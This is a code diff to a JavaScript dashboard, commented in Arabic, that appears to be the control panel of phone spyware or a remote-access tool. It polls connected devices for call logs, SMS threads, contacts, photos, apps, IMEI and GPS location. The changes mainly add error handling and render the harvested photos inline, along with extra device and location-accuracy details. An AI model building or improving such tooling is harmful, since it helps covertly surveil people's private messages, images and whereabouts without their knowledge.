@@ -1,3 +1,4 @@
+// التحقق من تسجيل الدخول
 if (sessionStorage.getItem('logged_in') !== 'true') {
     window.location.href = 'login.html';
 }
@@ -17,6 +18,7 @@ function logout() {
     window.location.href = 'login.html';
 }
 
+// حذف الجهاز
 async function deleteDevice() {
     if (!currentDevice) return;
     if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
@@ -27,9 +29,12 @@ async function deleteDevice() {
         loadDevices();
         currentDevice = null;
         document.getElementById('deviceSelect').value = '';
-    } catch (e) {}
+    } catch (e) {
+        alert('خطأ في الحذف');
+    }
 }
 
+// تحميل الأجهزة
 async function loadDevices() {
     try {
         const response = await fetch('/devices.json');
@@ -46,19 +51,29 @@ async function loadDevices() {
             select.appendChild(option);
         });
         
-        if (currentValue) select.value = currentValue;
-    } catch (e) {}
+        if (currentValue) {
+            select.value = currentValue;
+        }
+    } catch (e) {
+        console.error('Devices error:', e);
+    }
 }
 
 function selectDevice(deviceId) {
     currentDevice = deviceId;
+    
     if (updateInterval) clearInterval(updateInterval);
     if (dataInterval) clearInterval(dataInterval);
     
     if (deviceId) {
+        // تحديث الحالة كل 3 ثوانٍ
         updateInterval = setInterval(updateLiveData, 3000);
+        
+        // تحديث البيانات الكاملة كل 5 ثوانٍ
         dataInterval = setInterval(() => {
-            if (currentDevice) loadAllData();
+            if (currentDevice) {
+                loadAllData();
+            }
         }, 5000);
         
         updateLiveData();
@@ -111,7 +126,9 @@ async function updateLiveData() {
         if (data.apps_count !== undefined) 
             document.getElementById('appsCount').textContent = `(${data.apps_count})`;
         
-    } catch (e) {}
+    } catch (e) {
+        console.error('Live error:', e);
+    }
 }
 
 async function loadAllData() {
@@ -119,6 +136,7 @@ async function loadAllData() {
     await loadCalls();
     await loadSMS();
     await loadContacts();
+    await loadImages();
     await loadApps();
     await loadDeviceInfo();
 }
@@ -165,7 +183,7 @@ function displayCallsList() {
     
     Object.keys(callGroups).forEach(number => {
         const calls = callGroups[number];
-        const lastCall = calls[0]; // الأحدث
+        const lastCall = calls[0]; // الأحدث لأن الترتيب DESC
         
         const div = document.createElement('div');
         div.className = 'conversation-item';
@@ -242,6 +260,7 @@ function displayConversations() {
         return;
     }
     
+    // تجميع حسب الرقم
     const conversations = {};
     allSMS.forEach(sms => {
         const number = sms.address || 'غير معروف';
@@ -251,7 +270,7 @@ function displayConversations() {
     
     Object.keys(conversations).forEach(number => {
         const messages = conversations[number];
-        const lastMessage = messages[messages.length - 1];
+        const lastMessage = messages[0]; // الأحدث لأن الترتيب DESC
         
         const div = document.createElement('div');
         div.className = 'conversation-item';
@@ -278,6 +297,9 @@ function openChat(number) {
     messagesList.innerHTML = '';
     
     const chatMessages = allSMS.filter(sms => sms.address === number);
+    
+    // ترتيب من الأقدم للأحدث داخل المحادثة
+    chatMessages.reverse();
     
     chatMessages.forEach(sms => {
         const div = document.createElement('div');
@@ -401,24 +423,39 @@ async function loadImages() {
             const div = document.createElement('div');
             div.className = 'image-item';
             
-            const icon = document.createElement('div');
-            icon.className = 'image-icon';
-            icon.textContent = '🖼️';
+            const img = document.createElement('img');
+            
+            // عرض الصورة من Base64
+            if (image.data) {
+                // تحديد نوع الصورة
+                let mimeType = 'image/jpeg';
+                if (image.name) {
+                    const ext = image.name.toLowerCase().split('.').pop();
+                    if (ext === 'png') mimeType = 'image/png';
+                    else if (ext === 'gif') mimeType = 'image/gif';
+                    else if (ext === 'webp') mimeType = 'image/webp';
+                }
+                img.src = `data:${mimeType};base64,${image.data}`;
+            } else {
+                // صورة بديلة
+                img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="150" height="150"><rect width="150" height="150" fill="#1a1a4e"/><text x="75" y="75" text-anchor="middle" fill="#888" font-size="30">📷</text></svg>');
+            }
+            
+            img.className = 'thumb';
+            img.alt = image.name || `صورة ${index + 1}`;
+            img.onclick = () => window.open(img.src, '_blank');
             
             const name = document.createElement('div');
             name.className = 'image-name';
             name.textContent = image.name || `صورة ${index + 1}`;
             
-            const path = document.createElement('div');
-            path.className = 'image-path';
-            path.textContent = image.path || '';
-            
-            div.appendChild(icon);
+            div.appendChild(img);
             div.appendChild(name);
-            div.appendChild(path);
             grid.appendChild(div);
         });
-    } catch (e) {}
+    } catch (e) {
+        console.error('Images error:', e);
+    }
 }
 
 // ============ التطبيقات ============
@@ -467,6 +504,8 @@ async function loadDeviceInfo() {
                 <div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div>
                 <div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div>
                 <div class="info-card"><span>الناقل:</span><strong>${info.carrier || '—'}</strong></div>
+                <div class="info-card"><span>الذاكرة:</span><strong>${formatBytes(info.total_ram)}</strong></div>
+                <div class="info-card"><span>المساحة الحرة:</span><strong>${formatBytes(info.free_storage)}</strong></div>
             </div>
         `;
     } catch (e) {}
@@ -479,6 +518,7 @@ function showLocationDetails(location) {
         div.innerHTML = `
             <p>📍 خط العرض: ${location.latitude.toFixed(6)}</p>
             <p>📍 خط الطول: ${location.longitude.toFixed(6)}</p>
+            <p>📏 الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
         `;
     }
 }
@@ -522,5 +562,6 @@ function getCallType(type) {
     }
 }
 
+// تحميل الأجهزة عند الفتح
 loadDevices();
 setInterval(loadDevices, 10000);
